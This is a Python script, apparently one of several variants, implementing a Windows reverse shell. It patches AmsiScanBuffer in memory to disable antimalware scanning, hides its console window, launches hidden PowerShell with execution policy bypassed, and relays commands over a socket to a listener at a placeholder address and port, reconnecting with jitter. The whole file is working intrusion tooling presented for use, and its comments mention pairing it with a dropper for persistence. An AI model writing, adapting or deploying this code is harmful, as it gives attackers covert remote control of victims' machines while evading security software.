'''Variant 3 – Threaded I/O + minimal AMSI evasion
Main differences from previous versions

Uses separate threads for reading socket and reading process output (non-blocking, more responsive)
Attempts a very naive AMSI bypass via memory patch (works on many default Windows 10/11 installs before 2024–2025 hardening)
Slightly better error handling and socket timeout
No persistence code (assumes dropper or manual persistence)'''

import socket, subprocess, threading, time, sys, ctypes
from base64 import b64encode, b64decode

HOST = "127.0.0.1"
PORT = 4444
BUFFER = 8192

def patch_amsi():
    try:
        ctypes.windll.kernel32.VirtualProtect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_uint32, ctypes.POINTER(ctypes.c_uint32)]
        amsi = ctypes.windll.LoadLibrary("amsi.dll")
        addr = ctypes.cast(amsi.AmsiScanBuffer, ctypes.c_void_p).value
        old = ctypes.c_uint32()
        ctypes.windll.kernel32.VirtualProtect(addr, 1, 0x40, ctypes.byref(old))
        ctypes.memset(addr, 0xC3, 1)  # ret
        ctypes.windll.kernel32.VirtualProtect(addr, 1, old.value, ctypes.byref(old))
    except:
        pass

def sock_to_proc(sock, proc):
    while True:
        try:
            data = sock.recv(BUFFER)
            if not data: return
            proc.stdin.write(data)
            proc.stdin.flush()
        except:
            return

def proc_to_sock(sock, proc):
    while True:
        try:
            data = proc.stdout.read(BUFFER)
            if not data: return
            sock.sendall(data)
        except:
            return

def main():
    patch_amsi()
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    while True:
        try:
            s = socket.socket()
            s.settimeout(10)
            s.connect((HOST, PORT))

            p = subprocess.Popen(
                ["powershell.exe", "-NoP", "-NonI", "-W", "Hidden", "-EP", "Bypass", "-C", "$null"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                shell=False,
                bufsize=0
            )

            t1 = threading.Thread(target=sock_to_proc, args=(s, p), daemon=True)
            t2 = threading.Thread(target=proc_to_sock, args=(s, p), daemon=True)
            t1.start(); t2.start()

            t1.join(); t2.join()

        except:
            time.sleep(4 + time.time() % 5)  # pseudo-jitter
            continue

if __name__ == "__main__":
    main()